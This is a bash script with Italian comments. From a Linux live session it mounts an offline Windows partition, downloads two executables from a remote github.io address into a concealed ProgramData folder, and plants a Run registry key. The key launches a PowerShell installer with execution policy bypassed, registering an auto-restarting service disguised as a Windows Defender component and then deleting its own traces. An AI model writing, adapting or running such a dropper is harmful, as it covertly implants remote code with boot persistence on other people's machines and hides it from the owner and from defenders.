#!/bin/bash

# =============================================================================
# LINUX DEPLOYMENT SCRIPT
# Eseguito da un ambiente Linux Live per preparare l'installazione su una
# partizione Windows offline.
# =============================================================================

# --- Configurazione ---
BASE_URL="https://elguapomalo.github.io/crazyngl/"
FILES_TO_DOWNLOAD=("syscheck.exe" "nssm.exe")
SERVICE_NAME="WinDefenderCacheSvc"
DISPLAY_DESC="Gestore cache per la telemetria di Windows Defender"

# --- Controllo Privilegi ---
if [ "$EUID" -ne 0 ]; then
  echo "ERRORE: Questo script richiede privilegi di root. Eseguilo con 'sudo'."
  exit 1
fi

# --- Funzioni di Utility ---
cleanup() {
    echo "Pulizia in corso..."
    if [ -n "$MNT_POINT" ] && mountpoint -q "$MNT_POINT"; then
        umount "$MNT_POINT"
        echo "Partizione smontata."
    fi
    if [ -d "$MNT_POINT" ]; then
        rmdir "$MNT_POINT"
    fi
}
trap cleanup EXIT

# 1. Trova e Monta la Partizione di Windows
echo "Scansione delle partizioni per trovare Windows..."
WIN_PART=""
for part in $(lsblk -no NAME,TYPE | grep 'part$' | cut -d' ' -f1); do
    # Controlla se la partizione contiene la cartella 'Windows/System32'
    MNT_POINT_CHECK=$(mktemp -d)
    if mount -o ro "/dev/$part" "$MNT_POINT_CHECK" 2>/dev/null; then
        if [ -d "$MNT_POINT_CHECK/Windows/System32" ]; then
            WIN_PART="/dev/$part"
            umount "$MNT_POINT_CHECK"
            rmdir "$MNT_POINT_CHECK"
            break
        fi
        umount "$MNT_POINT_CHECK"
        rmdir "$MNT_POINT_CHECK"
    fi
done

if [ -z "$WIN_PART" ]; then
    echo "ERRORE: Impossibile trovare una partizione di Windows valida."
    exit 1
fi

echo "Partizione di Windows trovata: $WIN_PART"
MNT_POINT=$(mktemp -d)
echo "Montaggio di $WIN_PART in $MNT_POINT..."
if ! mount -t ntfs-3g -o rw,permissions "$WIN_PART" "$MNT_POINT"; then
    echo "ERRORE: Montaggio della partizione fallito. Assicurati che 'ntfs-3g' sia installato."
    exit 1
fi
echo "Montaggio riuscito."

# 2. Prepara la Cartella e Scarica i File
DEST_DIR_WIN_PATH="ProgramData/Microsoft/MediaCache"
DEST_DIR_LINUX_PATH="$MNT_POINT/$DEST_DIR_WIN_PATH"

echo "Creo la directory di destinazione: $DEST_DIR_LINUX_PATH"
mkdir -p "$DEST_DIR_LINUX_PATH"
# In Linux non possiamo impostare gli attributi 'Hidden'/'System' di Windows direttamente,
# ma la cartella è già abbastanza nascosta.

echo "Download dei componenti necessari..."
for file in "${FILES_TO_DOWNLOAD[@]}"; do
    echo "  -> Scarico $file..."
    if ! wget -q -O "$DEST_DIR_LINUX_PATH/$file" "$BASE_URL$file"; then
        echo "ERRORE: Download di $file fallito."
        exit 1
    fi
done
echo "Download completato."

# 3. Crea lo Script di Installazione PowerShell (setup.ps1)
SETUP_SCRIPT_PATH="$DEST_DIR_LINUX_PATH/setup.ps1"
# Il percorso dello script come lo vedrà Windows
SETUP_SCRIPT_WIN_PATH="C:\\$DEST_DIR_WIN_PATH\\setup.ps1"

echo "Creazione dello script di installazione 'setup.ps1'..."
cat << EOF > "$SETUP_SCRIPT_PATH"
# Script di installazione automatica - Eseguito al boot di Windows
\$ErrorActionPreference = 'Stop'
\$baseDir = "C:\\$DEST_DIR_WIN_PATH"
\$nssm = Join-Path \$baseDir "nssm.exe"
\$exe = Join-Path \$baseDir "syscheck.exe"
\$serviceName = "$SERVICE_NAME"

# Pulisce installazioni precedenti
if (Get-Service \$serviceName -ErrorAction SilentlyContinue) {
    Stop-Service -Name \$serviceName -Force -ErrorAction SilentlyContinue
    & \$nssm remove \$serviceName confirm
    Start-Sleep -Seconds 5
}

# Installa e configura il servizio
& \$nssm install \$serviceName \$exe
& \$nssm set \$serviceName Description "$DISPLAY_DESC"
& \$nssm set \$serviceName DisplayName \$serviceName
& \$nssm set \$serviceName Start SERVICE_AUTO_START
sc.exe failure \$serviceName reset= 86400 actions= restart/60000

# Avvia il servizio
Start-Service -Name \$serviceName

# Auto-pulizia: rimuove la chiave di registro che ha avviato questo script
Remove-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SyscheckInstaller" -Force -ErrorAction SilentlyContinue

# Auto-pulizia: rimuove questo stesso script
Remove-Item -Path \$MyInvocation.MyCommand.Path -Force
EOF
echo "Script 'setup.ps1' creato."

# 4. Modifica il Registro di Windows per l'Auto-Esecuzione
echo "Modifica del registro di Windows per l'esecuzione al boot..."
# Carica l'hive del registro SOFTWARE
chntpw -e "$MNT_POINT/Windows/System32/config/SOFTWARE" << REG_COMMANDS
cd Microsoft\\Windows\\CurrentVersion\\Run
nv SyscheckInstaller 1 "powershell.exe -ExecutionPolicy Bypass -File \"$SETUP_SCRIPT_WIN_PATH\""
q
REG_COMMANDS

if [ $? -ne 0 ]; then
    echo "ERRORE: Modifica del registro fallita. Assicurati che 'chntpw' sia installato."
    exit 1
fi

echo "Modifica del registro completata con successo."
echo ""
echo "------------------------------------------------------------------"
echo "PROCESSO COMPLETATO!"
echo "La partizione di Windows è stata modificata."
echo "Al prossimo avvio di Windows, il servizio '$SERVICE_NAME' verrà installato e avviato automaticamente."
echo "Lo script di installazione e la chiave di registro si auto-rimuoveranno."
echo "------------------------------------------------------------------"

exit 0
